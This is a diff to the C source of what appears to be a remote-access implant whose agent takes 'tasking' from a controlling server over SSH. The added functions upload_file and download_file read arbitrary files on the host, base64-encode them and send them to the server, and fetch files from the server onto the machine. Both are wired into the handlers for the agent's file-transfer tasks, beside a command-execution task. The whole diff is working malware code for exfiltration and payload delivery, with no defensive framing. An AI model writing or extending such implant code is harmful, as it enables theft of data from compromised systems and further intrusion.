@@ -297,6 +297,205 @@ int func_loop(ssh_session session)
   	return SSH_OK;
 }
 
+int misc_get_file(char *name, char **ptr){
+    int size = 0;
+    FILE *file = NULL;
+    file = fopen(name, "rb");
+
+    if (file == NULL)
+    {
+        printf("Failed to open file %s\n", name);
+        return -1;
+    }
+    fseek(file, 0L, SEEK_END);
+    size = ftell(file);
+
+    *ptr = malloc(size);
+    memset(*ptr, 0, size);
+    rewind(file);
+    fread(*ptr, 1, size, file);
+    fclose(file);
+
+    return size;
+}
+
+int misc_index_of(char* str, char find, int rev){
+    if (rev)
+    {
+        int end = strlen(str);
+        int ctr = 0;
+        while(end - ctr > 0){
+            if(str[end-ctr] == find){
+                return end - ctr;
+            }
+            ctr++;
+        }
+        return -1;
+    } else {
+        int i = 0;
+
+        while (str[i] != '\0')
+        {
+            if (str[i] == find)
+            {
+                return i;
+            }
+
+            i++;
+        }
+
+        return -1;
+    }
+}
+
+int upload_file(ssh_channel chan, char *path){
+	char buff[BUFSIZ];
+    char directory[BUFSIZ];
+    char tmpbuffer[8];
+    char *file_data;
+    char *enc_data;
+    int size = 0;
+    int size_e = 0;
+    int rc = 0;
+
+	printf("Sending file -> %s\n", path);
+	int offset = misc_index_of(path, '/', 1);
+	
+    memset(buff, 0, sizeof(buff));
+    memset(directory, 0, sizeof(directory));
+	memset(tmpbuffer, 0, sizeof(tmpbuffer));
+	
+	size = misc_get_file(path, &file_data);
+
+	path = path + offset +1;
+	sprintf(buff, "11|%s", path);
+	ssh_channel_write(chan, buff, strlen(buff));
+	ssh_channel_read(chan, tmpbuffer, 3, 0);
+    // get filesize 
+        
+    if(size < 0){
+        printf("Filename '%s' does not exist\n", path); 
+        rc = ssh_channel_write(chan, "er", 3);
+        if(rc == SSH_ERROR){
+            printf("Failed to write data to channel: %s\n",  ssh_get_error(ssh_channel_get_session(chan)));
+        }
+        return 2;
+    }
+    
+    size_e = b64_encoded_size(size);
+    sprintf(tmpbuffer, "%d", size_e);
+        
+    // writes file size
+    rc = ssh_channel_write(chan, tmpbuffer, sizeof(tmpbuffer));
+    if(rc == SSH_ERROR){
+        printf("Failed to write data to channel: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
+        return 1;
+    }
+    
+    rc = ssh_channel_read(chan, buff, sizeof(buff), 0);
+    if(rc == SSH_ERROR){
+        printf("Failed to write data to channel: %s\n",  ssh_get_error(ssh_channel_get_session(chan)));
+        return 1;
+    }
+        
+    enc_data = b64_encode((unsigned char *)file_data, size);
+        
+    // writes file 
+    rc = ssh_channel_write(chan, enc_data, size_e);
+    if(rc == SSH_ERROR){
+        printf("Failed to write data to channel: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
+        return 1;
+    }
+    memset(tmpbuffer, 0, 8);
+    
+    rc = ssh_channel_read(chan, tmpbuffer, 8, 0);
+    if(rc == SSH_ERROR){
+        printf("Failed to write data to channel: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
+        return 1;
+    }
+
+    free(file_data);
+    free(enc_data);
+
+    return 0;
+}
+
+int download_file(ssh_channel chan, char *filename){
+	int rc = 0;
+    int size = 0;
+    int size_e = 0;
+    char *data_ptr;
+    char *enc_ptr;
+    char buff[BUFSIZ*2];
+    char tmpbuffer[256];
+    FILE *file;
+
+	memset(buff, 0, sizeof(buff));
+	sprintf(buff, "10|%s", filename);
+
+    rc = ssh_channel_write(chan, buff, strlen(buff));
+    if(rc == SSH_ERROR){
+        printf("Caught channel error: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
+        return 1;
+    }
+
+    memset(tmpbuffer, 0, sizeof(tmpbuffer));
+    rc = ssh_channel_read(chan, tmpbuffer, sizeof(tmpbuffer), 0);
+    if(rc == SSH_ERROR){
+        printf("Caught channel error: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
+        return 1;
+    }
+
+    size = atoi(tmpbuffer);
+    data_ptr = malloc(size+1);
+    memset(data_ptr, 0, size+1);
+            
+    // writes file size
+    rc = ssh_channel_write(chan, "ok", 3);
+    if(rc == SSH_ERROR){
+        printf("Caught channel error: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
+        return 1;
+    }
+    rc = ssh_channel_read(chan, data_ptr, size, 0);
+    if(rc == SSH_ERROR){
+        printf("Caught channel error: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
+        return 1;
+    }
+
+    size_e = b64_decoded_size(data_ptr);
+
+    enc_ptr = malloc(size_e);
+    if(!b64_decode(data_ptr, (unsigned char*)enc_ptr, size_e)){
+        printf("Failed to decode data\n");
+        free(data_ptr);
+        free(enc_ptr);
+        return 1;
+    }
+    free(data_ptr);
+            
+    // writes file 
+    rc = ssh_channel_write(chan, "ok", 3);
+    if(rc == SSH_ERROR){
+        printf("Caught channel error: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
+        return 1;
+    }
+
+    memset(buff, 0, sizeof(buff));
+    memset(tmpbuffer, 0, sizeof(tmpbuffer));
+    sprintf(buff, "%s/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), filename);
+    printf("%s\n", buff);
+    file = fopen(buff, "wb");
+    if(file == NULL){
+        perror("");
+        return 1;
+    }
+    fwrite(enc_ptr, 1, size_e, file);
+    fclose(file);
+    free(enc_ptr);
+
+    return 0;
+}
+
 int parse_tasking(char *tasking, ssh_channel chan){
 	/* Parses and handles the tasking input from the server*/
 
@@ -349,6 +548,7 @@ int parse_tasking(char *tasking, ssh_channel chan){
 		{
 		case AGENT_DOWN_FILE:
 			printf("Got tasking to download file %s\n", tasking_arr[j]->opts);
+			download_file(chan, tasking_arr[j]->opts);
 			//rc = download(tasking_arr[j].opts);
 			//ssh_channel_write(chan, )
 			break;
@@ -357,6 +557,7 @@ int parse_tasking(char *tasking, ssh_channel chan){
 			break;
 		case AGENT_UP_FILE:
 			printf("Got tasking to upload file %s\n", tasking_arr[j]->opts);
+			upload_file(chan, tasking_arr[j]->opts);
 			break;
 		case AGENT_EXEC_SC:
 			printf("Got tasking to execute command %s\n", tasking_arr[j]->opts);
@@ -385,7 +586,8 @@ int parse_tasking(char *tasking, ssh_channel chan){
 		printf("Freeing shit.\nOperation: %d\nOptions: %s\n", tasking_arr[k]->operation, tasking_arr[k]->opts);
 		if(tasking_arr[k] == NULL) continue;
 		if(tasking_arr[k]->opts != NULL) free(tasking_arr[k]->opts);
-		if(tasking_arr[k]->operation != NULL) free(tasking_arr[k]);
+		free(tasking_arr[k]);
+		//if(tasking_arr[k]->operation != NULL) free(tasking_arr[k]);
 	}
 	printf("Finished freeing shit\n");
 	return 0;
